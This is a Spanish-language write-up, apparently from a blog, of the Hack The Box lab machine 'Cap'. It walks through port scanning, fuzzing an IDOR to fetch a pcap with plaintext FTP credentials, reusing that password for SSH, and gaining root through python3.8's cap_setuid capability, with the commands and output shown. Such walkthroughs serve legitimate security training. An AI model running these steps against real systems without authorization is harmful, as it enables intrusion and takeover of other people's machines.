---
title: Cap WriteUp
date: 2023-04-11
categories: [WriteUps, Máquinas Linux]
tags: [pcap, FTP, cap_setuid]
image:
  path: ../../assets/img/writeups/Cap/cap.png
  width: 528
  height: 340
  alt: Banner Cap
---

La máquina tiene los puertos 21, 22 y 80 abiertos. En la página web nos aprovechamos de un IDOR(Insecure Direct Object References) para descargarnos un .pcap con contenido donde nos encontramos una contraseña de acceso a la máquina por ssh.

Escalada: Para conseguir ser el amo y señor(root) nos aprochamos de las capabilities, en concreto de cap_setuid.

## Reconocimiento

La ip de la máquina **Cap** es `10.10.10.245`.

LO primero es comprobar que tenemos conexión con ella:
```
❯ ping -c 1 10.10.10.245

PING 10.10.10.245 (10.10.10.245) 56(84) bytes of data.
64 bytes from 10.10.10.245: icmp_seq=1 ttl=63 time=44.3 ms

--- 10.10.10.245 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 44.295/44.295/44.295/0.000 ms
```
Y si, un paquete enviado, un paquete recibido.

Escanearé los puertos de la máquina para saber cuales son los que están abiertos. Los puertos abiertos son la puerta de entrada para los pentesters y los sombreros del color que sean.

```
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.245 -oG allPorts

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-09 15:44 CEST
Initiating SYN Stealth Scan at 15:44
Scanning 10.10.10.245 [65535 ports]
Discovered open port 80/tcp on 10.10.10.245
Discovered open port 21/tcp on 10.10.10.245
Discovered open port 22/tcp on 10.10.10.245
Completed SYN Stealth Scan at 15:44, 12.19s elapsed (65535 total ports)
Nmap scan report for 10.10.10.245
Host is up, received user-set (0.052s latency).
Scanned at 2023-04-09 15:44:35 CEST for 12s
Not shown: 65509 closed tcp ports (reset), 23 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 63
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 12.51 seconds
           Raw packets sent: 66037 (2.906MB) | Rcvd: 65512 (2.620MB)
```
Las opciones usadas son:

* -p- : Escanea todos los puertos. Hay un total de 65535 puertos
* --open : Muestra únicamente los puertos abiertos.
* -sS : Realiza un TCP SYN Scan
* --min-rate 5000 : Para enviar paquetes no más lentos que 5000 paquetes por segundo
* -vvv : Muestra la información en pantalla mientras se realiza el escaneo
* -n : Para no aplicar resolución DNS
* -Pn : Para que no aplique el protocolo ARP
* 10.10.10.245 : Dirección IP objetivo, la cual quiero escanear
* -oG allPorts : Exportará el output a un fichero grepeable que llamaremos "allPorts"

La máquina tiene los siguientes puertos abiertos; 21/ftp, 22/ssh, 80/http.

Usaré el siguiente comando para profundizar un poco más sobre estos puertos; saber la versión y lanzar una serie de scripts básicos de reconocimiento.

```
❯ nmap -p21,22,80 -sC -sV 10.10.10.245 -oN targeted 

Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-09 15:53 CEST
Stats: 0:01:49 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 66.67% done; ETC: 15:56 (0:00:54 remaining)
Nmap scan report for 10.10.10.245
Host is up (0.042s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    gunicorn
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 NOT FOUND
|     Server: gunicorn
```

Era más largo que eso, porque del puerto 80 ha salido mucho texto, pero nada importante que distingan mis ojos.

## Buscando vulnerabilidades

Empezaré por el puerto 21/ftp. La versión es vsftpd 3.0.3, busco con searchsploit si es ua versión vulnerable.

![Searchsploit]({{ 'assets/img/writeups/Cap/searchsploit.png' | relative_url }}){: .center-image }

Hay una vulnerabilidad, pero es una denegación de servicio -un ataque DoS- y no procede. Quiero decir que no consiguiriamos nuestro propósito con este tipo de ataque, como mucho bloquearíamos las conexiones hacia la máquina objetivo.

Podríamos probar a conectarnos con el usario anonymous al servicio ftp peeero no creo que podamos porque el comando de nmap anterior nos suele detectar cuando es vulnerable, aun así comprobamos por si acaso.
```
❯ ftp 10.10.10.245

Connected to 10.10.10.245.
220 (vsFTPd 3.0.3)
Name (10.10.10.245:guise): anonymous
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
```
Confirmado pues. No veo nada interesante por el puerto 21, así que pasamos al 80/http. Por el 22/ssh al no tener credenciales de acceso lo omitimos. Podríamos hacer ataques de fuerza bruta sobre este servicio pero el órden que suelo llevar es curiosear por el puerto 80 primero.

Pasemos al puerto 80/http entonces. Lanzo un whatweb a la página para ver las tecnologías que corren por detrás de la web:
```
❯ whatweb http://10.10.10.245

http://10.10.10.245 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[gunicorn], IP[10.10.10.245], JQuery[2.2.4], Modernizr[2.8.3.min], Script, Title[Security Dashboard], X-UA-Compatible[ie=edge]
```
Entremos al navegador y veamos que pinta tiene la página web.

![Web]({{ 'assets/img/writeups/Cap/web.png' | relative_url }}){: .center-image }

Parece que estamos ya logueados con el usuario Nathan.

Hay un buscador donde podría probar inyecciones o un LFI. Meto una comilla pero en principio nada, lo dejo para más tarde, prefiero realizar antes una búsqueda de subdirectorios.
```
wfuzz -c --hc=404 -t 150 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt  http://10.10.10.245/FUZZ
```
Encuentro los subdirectorios que ya se ven en desde el navegador; ip, netstat y capture, más el subdirectorio data, pero que no tenemos acceso para verlo. Fuzzeo tambíen por php y por txt tanto en la página principal como en el subdirectorio /data:
```
❯ wfuzz -c --hc=404 --hh=208 -t 150 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -z list,txt-php  http://10.10.10.245/data/FUZZ.FUZ2Z
```
El --hh=208 es porque en la búsqueda sin él salían muchos resultados que daban 208 caracteres, --hh : hide characters. Pero no sale nada.

Pero buscando subdirectorios dentro del subdirectorio data encuentro algo. Luego caigo que corresponden al directorio visible por la web "Security Snapshot", en este apartado puedes descargarte un pcap, desde el navegador sale esto; `http://10.10.10.245/data/4` ,en el número 4 no hay nada, pero puedes ir fuzzeando por resto de números a ver que te encuentras.

![pcap]({{ 'assets/img/writeups/Cap/pagepcap.png' | relative_url }}){: .center-image }

```
❯ wfuzz -c --hc=404 --hh=208 -t 100 -z range,1-5000 http://10.10.10.245/data/FUZZ

 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.245/data/FUZZ
Total requests: 5000

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================

000000003:   200        370 L    993 W      17143 Ch    "3"                                                                                                                    
000000004:   200        370 L    993 W      17143 Ch    "4"                                                                                                                    
000000002:   200        370 L    993 W      17143 Ch    "2"                                                                                                        
```
En ninguno hay contenido. La verdad que han sido un poco puñeteros porque donde si que hay es en el 0. Si en vez del 1-5000 pones del 0-5000 lo hubieramos encontrado de esta manera. Yo lo localicé haciendo un wfuzz al subdirectorio data:
```
❯ wfuzz -c --hc=404 --hh=208 -t 150 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.245/data/FUZZ

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.245/data/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================

000000064:   200        370 L    993 W      17143 Ch    "02"                                                                                                                   
000000059:   200        370 L    993 W      17143 Ch    "04"                                                                                                                   
000000051:   200        370 L    993 W      17143 Ch    "2"                                                                                                                    
000000074:   200        370 L    993 W      17143 Ch    "4"                                                                                                                    
000000070:   200        370 L    993 W      17143 Ch    "3"                                                                                                                    
000000060:   200        370 L    993 W      17143 Ch    "03"                                                                                                                   
000000124:   200        370 L    993 W      17146 Ch    "0"                                                                                                                    
000000713:   200        370 L    993 W      17146 Ch    "00"
```

## Explotación


Y en `http://10.10.10.245/data/0`si que encuentro un pcap con información que me descargo inmediatamente.

Los archivos **pcap** son archivos de datos de paquetes de red, guardan capturas de esos paquetes. Es un archivo especial de The Wireshark.

Suelo abrirlos con thsark:
```
> tshark -r 0.pcap
``` 
Y esto es lo que encuentro:

![Cap]({{ 'assets/img/writeups/Cap/cap.png' | relative_url }}){: .center-image }

Encuentro unas credenciales de acceso al FTP:

User: nathan  
Password: Buck3tH4TF0RM3!

Entremos al servicio ftp, encontramos un user.txt y nos lo descargamos:
```
❯ ftp 10.10.10.245
Connected to 10.10.10.245.
220 (vsFTPd 3.0.3)
Name (10.10.10.245:guise): nathan
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-r--------    1 1001     1001           33 Apr 09 13:33 user.txt
226 Directory send OK.
ftp> get user.txt
local: user.txt remote: user.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for user.txt (33 bytes).
226 Transfer complete.
33 bytes received in 0.00 secs (460.3795 kB/s)
```
Ya tenemos la primera flag:
```
> cat user.txt

147e63cd159c2e74bdbf*********
```
Tengo una contraseña del usuario nathan por ftp, ¿ y si es también la contraseña de acceso por ssh?. Esto hay que probarlo, es una práctica habitual reciclar contraseñas.
```
> ssh nathan@10.10.10.245
```
Metemos la contraseña que teníamos y estamos dentro:

![Dentro]({{ 'assets/img/writeups/Cap/dentro.png' | relative_url }}){: .center-image }

## Escalada de privilegos

```
nathan@cap:~$ id
uid=1001(nathan) gid=1001(nathan) groups=1001(nathan)

nathan@cap:~$ sudo -l
[sudo] password for nathan: 
Sorry, user nathan may not run sudo on cap.

nathan@cap:/$ find \-perm -4000 2>/dev/null
./usr/bin/umount
./usr/bin/newgrp
./usr/bin/pkexec
./usr/bin/mount
./usr/bin/gpasswd
./usr/bin/passwd
./usr/bin/chfn
./usr/bin/sudo
./usr/bin/at
./usr/bin/chsh
./usr/bin/su
./usr/bin/fusermount

```
Todo lo anterior es típico y no vulnerable. Podríamos escalar posiblemente mendiante el pkexec pero la máquina no está hecha para hacerla así -la vulnerabilidad de pkexec como archivo SUID fue descubierta hace poco-.

Aquí está lo bueno:
```
nathan@cap:/$ getcap -r / 2>/dev/null

/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```
Siempre que veamos un "cap_setuid" podemos alegrarnos. Lo que puedes hacer con esto es tener la capacidad de establecer el uid que tu quieras, como por ejemplo el uid de root que por defecto es 0. En este caso lo tenemos mediante python 3.8.
```
nathan@cap:/$ python3.8
Python 3.8.5 (default, Jan 27 2021, 15:41:15) 
[GCC 9.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
>>> os.setuid(0)
>>> os.system("bash")
root@cap:/# whoami
root
```
¡¡Y hemos escalado a root!!

Conseguimos la flag de root y terminada la box **Cap**
```
root@cap:/# cat /root/root.txt
a8fbd4e0fa794a9027e******
```
Una de las máquinas más asequibles que he hecho. Aun así siempre se aprende algo. Un agradecimiento a hack the box y a los creadores de las máquinas.  
Y si alguien me lee **¡un placer!**, espero haber ayudado. 



